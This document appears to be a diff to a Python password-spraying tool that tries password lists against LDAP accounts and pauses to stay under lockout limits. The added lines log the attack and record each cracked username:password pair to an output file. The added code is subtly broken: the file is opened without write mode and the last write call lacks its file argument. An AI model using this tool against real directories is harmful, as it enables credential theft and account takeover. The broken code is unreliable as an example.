@@ -48,6 +48,11 @@ def loadContents(file):
     logging.debug(f'Reading the {file} as values {clean}')
     return clean
 
+# Function to write to a file
+def writeFile(msg, file):
+    with open(file) as f:
+        f.write(f"{msg}\n")
+        logging.debug(f"Wrote the following info {msg} to file {file}")
 
 # Attempt to authenticate on LDAP
 def authAttempt(server, domain, user, passwd):
@@ -121,6 +126,11 @@ successDict = {}
 
 logging.debug(f'Lockout number is {args.Lockout} and type {type(args.Lockout)}')
 
+if args.output:
+    t = localtime()
+    writeFile(f"Started attack at {asctime(t)} using Users file {args.Users} and password file {args.Passwords}.", args.output)
+    writeFile(f"Attacking {args.Domain} and server {args.Server} with {args.Lockout} attempts every {args.Window * 60} minutes.", args.output)
+
 for pwd in passwords:
     logging.debug(f'Attempting login with attempt count {atmptCount}')
     t = localtime()
@@ -132,6 +142,8 @@ for pwd in passwords:
             logging.debug(f'Successful authentication. Adding username {user} to successfulUsers list')
             successDict[user] = pwd
             successfulUsers.append(user)
+            if args.output:
+                writeFile(f"[{asctime(t)}]- Successful auth for {user}:{pwd}", args.output)
     atmptCount += 1
     if atmptCount >= args.Lockout:
         print(f'[{asctime(t)}]-' + Fore.YELLOW + f'[*] Hit attempt count of {args.Lockout}, sleeping for {args.Window} minutes')
@@ -141,5 +153,7 @@ for pwd in passwords:
 
 t = localtime()
 print(f'[{asctime(t)}]-' + Fore.CYAN + f'[*] Completed {len(users) * len(passwords)} total attempts')
+if args.output:
+    writeFile(f"[{asctime(t)}]- Completed attack")
 
         
